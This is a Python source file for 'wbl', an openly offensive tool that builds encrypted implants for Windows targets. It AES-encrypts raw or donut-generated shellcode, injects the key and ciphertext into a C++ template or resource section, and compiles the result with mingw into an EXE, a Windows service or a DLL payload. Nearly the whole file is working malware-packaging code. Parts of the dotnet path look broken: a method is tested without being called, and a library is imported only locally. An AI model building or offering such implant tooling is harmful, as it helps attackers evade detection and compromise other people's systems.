#!/usr/bin/python

from os import urandom,popen
import subprocess
import sys
import argparse
from Crypto.Cipher import AES
import hashlib

class wbl:

	def __init__(self,args):

		self.args = args

		self.mingw_path = self.check_mingw()
		self.windres_path = self.check_windres()

		if (self.mingw_path == ""): 
			print("[!!] ERROR: No path to x86_64-w64-mingw32-g++ found. Exiting.")
			sys.exit(0)
		
		if (self.windres_path == ""):
			print("[!!] ERROR: No path to x86_64-w64-mingw32-windres found. Exiting.")
			sys.exit(0)
	
		self.payload_key_hex = ""
		self.payload_hex = ""
		self.donut_shellcode = ""
		
	def check_mingw(self):

		try:
			return str(popen("whereis x86_64-w64-mingw32-g++").read()).strip().split(":")[1].strip().split()[0]

		except Exception as ex:

			print("[!!] check_mingw: %s" % ex)
			sys.exit(0)

	def check_windres(self):

		try:
			return str(popen("whereis x86_64-w64-mingw32-windres").read()).strip().split(":")[1].strip().split()[0]

		except Exception as ex:

			print("[!!] check_windres: %s" % ex)
			sys.exit(0)
	
	def check_donut(self,w):

		try:
			import donut
			print("[*] donut Python library successfully imported.")
			print("[*] %s : %s\n" % (donut.__doc__, donut.__file__, ))
		except Exception as ex:
			print("\n[*] ERROR - Unable to import donut library - required for dotnet-dll build type. %s" % ex)
			sys.exit(0)
			
		if ((w.args.className is None) or (w.args.methodName is None)):

			print("[!!] ERROR - Missing one or more parameters for dotnet-dll build type. \n[!!] ERROR - Besides SOURCE, BUILD, and PAYLOAD, the CLASSNAME (-c) and METHODNAME (-m) options are also required.\n")
			sys.exit(0)
		
		return True

	def create_encrypted_file(self):

		try:
			buf = open(self.args.payload,"rb").read()
		
		except Exception as ex:
			print("\n[!!] ERROR - encrypt_payload_file: Unable to read payload file: %s" % ex)
			sys.exit(0)
    		
		KEY = urandom(16)
		self.payload_key_hex = "0x" + ",0x".join(hex(x)[2:].zfill(2) for x in KEY)
		
		k = hashlib.sha256(KEY).digest()
		iv = 16 * b'\x00'

		pad = 16 - (len(buf) % 16)
		buf += bytes([pad])*pad

		cipher = AES.new(k, AES.MODE_CBC, iv)
		cipher_data = cipher.encrypt(bytes(buf))
		self.payload_hex = "0x" + ",0x".join(hex(x)[2:].zfill(2) for x in cipher_data)

		try: 
			print("[*] Encrypting (AES.MODE_CBC) payload binary file...",end='')
			f = open("./enc.bin",'wb')
			
			f.write(cipher_data)

			f.close()
			print("done (./enc.bin).")

		except Exception as ex:
			print("\n[!!] ERROR - encrypt_payload_file: Unable to create encrypted payload file: %s" % ex)
			sys.exit(0)

		try:
			print("[*] Payload decryption key: {%s}" % self.payload_key_hex)
		
		except Exception as ex:
			print("\n[!!] ERROR - encrypt_payload_file: Unable to output payload decryption key: %s" % ex)
			sys.exit(0)

	def create_donut_shellcode(self):

		try:
			self.donut_shellcode = donut.create(file=self.args.payload, arch=2, cls=self.args.className, method=self.args.methodName);

		except Exception as ex:
			print("\n[!!] ERROR - create_donut_shellcode() - %s" % ex)
			sys.exit(0)

	def create_donut_encrypted_file(self):
		
		KEY = urandom(16)
		self.payload_key_hex = "0x" + ",0x".join(hex(x)[2:].zfill(2) for x in KEY)
	
		k = hashlib.sha256(KEY).digest()
		iv = 16 * b'\x00'

		pad = 16 - (len(self.donut_shellcode) % 16)
		self.donut_shellcode += bytes([pad])*pad

		cipher = AES.new(k, AES.MODE_CBC, iv)
		cipher_data = cipher.encrypt(bytes(self.donut_shellcode))
		self.payload_hex = "0x" + ",0x".join(hex(x)[2:].zfill(2) for x in cipher_data)

		try: 
			print("[*] Encrypting (AES.MODE_CBC) payload binary file...",end='')
			f = open("./enc.bin",'wb')
			
			f.write(cipher_data)

			f.close()
			print("done (./enc.bin).")

		except Exception as ex:
			print("\n[!!] ERROR - encrypt_payload_file: Unable to create encrypted payload file: %s" % ex)
			sys.exit(0)

		try:
			print("[*] Payload decryption key: {%s}" % self.payload_key_hex)
		
		except Exception as ex:
			print("\n[!!] ERROR - encrypt_payload_file: Unable to output payload decryption key: %s" % ex)
			sys.exit(0)

	def create_resource_rc_file(self):

		try:
			with open('./resource.rc','w') as f:

				f.write("#include \"resource.h\"\n")
				f.write("#include \"winres.h\"\n\n")
				f.write("IDR_RCDATA1\t\tRCDATA\t\t\"enc.bin\"\n")

		except Exception as ex:
			print("\n[!!] ERROR - create_resource_file() - %s" % ex)
			sys.exit(0)
	
	def create_resource_h_file(self):

		try:
			with open('./resource.h','w') as f:

				f.write("#define\t\tIDR_RCDATA1\t\t101")

		except Exception as ex:
			print("\n[!!] ERROR - create_resource_file() - %s" % ex)
			sys.exit(0)
	
	def create_payload_file(self):

		flines = ""

		try:

			print("[*] Reading source code file at %s..." % self.args.source,end='')
			with open(self.args.source,'r') as f:

				flines = f.readlines()
			
			print("done.")

		except Exception as ex:
			
			print("\n[!!] ERROR - create_payload_file() - Reading payload file: %s" % ex)
			sys.exit(0)

		match self.args.generate:

			case "exe" | "srv-exe" | "dll":
			
				try:
					print("[*] Writing source code file with PAYLOADKEY & PAYLOAD replacement...",end='')
					with open("./source.cpp",'w') as nf:

						for line in flines:
							
							if "<<<PAYLOADKEY>>>" in line:  nf.write(line.replace("<<<PAYLOADKEY>>>",self.payload_key_hex))
							elif "<<<PAYLOAD>>>" in line: nf.write(line.replace("<<<PAYLOAD>>>",self.payload_hex))
							else: nf.write(line)

					print("done (./source.cpp).")

				except Exception as ex:
					print("\n[!!] ERROR - create_payload_file() - case exe, service-exe, dll - Create source.cpp file: %s" % ex)
					sys.exit(0)
			
			case "rsc-exe":
				
				try:
					print("[*] Writing source code file with PAYLOADKEY replacement...",end='')
					with open("./source.cpp",'w') as nf:

						for line in flines:
							
							if "<<<PAYLOADKEY>>>" in line:  nf.write(line.replace("<<<PAYLOADKEY>>>",self.payload_key_hex))
							else: nf.write(line)
							
					print("done (./source.cpp).")

				except Exception as ex:
					print("\n[!!] ERROR - create_payload_file() - case resource-exe, resource-service-exe - Create source.cpp file: %s" % ex)
					sys.exit(0)

	def compile_payload_file(self):
		
		try:

			match self.args.generate:

				case "exe": 
					
					print("[*] Compiling the EXE payload file...",end="")
					subprocess.call("%s -fpermissive -Wconversion-null -static-libstdc++ -static-libgcc -o ./payload.exe ./source.cpp" % self.mingw_path,shell=True)
					print("done (./payload.exe).")

				case "rsc-exe": 
					
					print("[*] Compiling the RESOURCE-EXE payload file...",end="")
					subprocess.call("%s ./resource.rc ./resource.o" % self.windres_path,shell=True)
					subprocess.call("%s -fpermissive -Wconversion-null -static-libstdc++ -static-libgcc -o ./payload.exe ./resource.o ./source.cpp" % self.mingw_path,shell=True)
					print("done (./payload.exe).")

				case "srv-exe": 
					
					print("[*] Compiling the SERVICE-EXE payload file...",end="")
					subprocess.call("%s -fpermissive -Wconversion-null -Wwrite-strings -static-libstdc++ -static-libgcc -o ./payload.exe ./source.cpp" % self.mingw_path,shell=True)
					print("done (./payload.exe).")

				case "dll":
					
					print("[*] Compiling the DLL payload file...",end="")
					subprocess.call("%s -fpermissive -Wconversion-null -static-libstdc++ -static-libgcc -shared -o ./payload.dll ./source.cpp" % self.mingw_path,shell=True)
					print("done (./payload.dll).\n")

		except Exception as ex:
			print("[!!] ERROR - compile_payload_file() : %s" % ex)
			sys.exit(0)

if __name__ == '__main__':

	banner = ""
	banner += "\n"
	banner += "\033[96m"
	banner += "▒█░░▒█ ▀█▀ █▀▀▄ █▀▀▄ █▀▀█ █░░░█ █▀▀ ▒█▀▀█ █░░█ ▒█░░░ ░▀░ █▀▀▄ █░░█ █░█ \n"
	banner += "▒█▒█▒█ ▒█░ █░░█ █░░█ █░░█ █▄█▄█ ▀▀█ ▒█▀▀▄ █▄▄█ ▒█░░░ ▀█▀ █░░█ █░░█ ▄▀▄ \n"
	banner += "▒█▄▀▄█ ▄█▄ ▀░░▀ ▀▀▀░ ▀▀▀▀ ░▀░▀░ ▀▀▀ ▒█▄▄█ ▄▄▄█ ▒█▄▄█ ▀▀▀ ▀░░▀ ░▀▀▀ ▀░▀ \n"
	banner += "@badhackjob 07.2022\033[0m"

	print("\n%s\n" % banner)

	desc = "Windows By Linux (wbl) - Utility to help generate unmanaged implants for Windows-based targets.\n"
	desc += "Utilizes the following: x86_64-w64-mingw32-g++, x86_64-w64-mingw32-windres, and the donut Python library."

	parser = argparse.ArgumentParser(description=desc,formatter_class=argparse.RawTextHelpFormatter)
	parser.add_argument('-s',dest='source',help='Path location of the C++ source code file.',required=True)

	parser.add_argument('-p',dest='payload',help='Path location of the payload file.',required=True)	
	parser.add_argument('-t',dest='type',help='Type of payload file: raw, dotnet',required=True)

	generate_help = "Generate the following implant type: "
	generate_help += "\n   exe\t\tMS Windows PE32+ executable x86-64"
	generate_help += "\n   srv-exe\tMS Windows Service PE32+ executable x86-64"
	generate_help += "\n   rsc-exe\tResource (.rsrc) Section, MS Windows PE32+ executable x86-64"
	generate_help += "\n   dll\t\tMS Windows PE32+ (DLL) executable x86-64"
	parser.add_argument('-g',dest='generate',help=generate_help,required=True)
	
	class_help = "Class name of the .NET Dll (dotnet-* build types only), used for donut shellcode generation."
	parser.add_argument('-c',dest='className',help=class_help)

	method_help = "Method name of the .NET Dll (dotnet-* build types only), used for donut shellcode generation."
	parser.add_argument('-m',dest='methodName',help=method_help)

	args = parser.parse_args()
	
	w = wbl(args)

	print("[*] mingw path %s." % w.mingw_path)
	print("[*] windres path %s." % w.windres_path)

	match w.args.type:

		case "raw":

			match w.args.generate:

				case "exe" | "srv-exe" | "dll":

					w.create_encrypted_file();
					w.create_payload_file();
					w.compile_payload_file();
					
				case "rsc-exe":

					w.create_encrypted_file();
					w.create_resource_rc_file();
					w.create_resource_h_file();
					w.create_payload_file();
					w.compile_payload_file();

		case "dotnet":

			if ( w.check_donut):
				
				match w.args.generate:

					case "exe" | "srv-exe" | "dll":
						
						w.create_donut_shellcode();
						w.create_donut_encrypted_file();
						w.create_payload_file();
						w.compile_payload_file();
					
					case "rsc-exe":
						
						w.create_donut_shellcode();
						w.create_donut_encrypted_file();
						w.create_resource_rc_file();
						w.create_resource_h_file();
						w.create_payload_file();
						w.compile_payload_file();

	print("\n")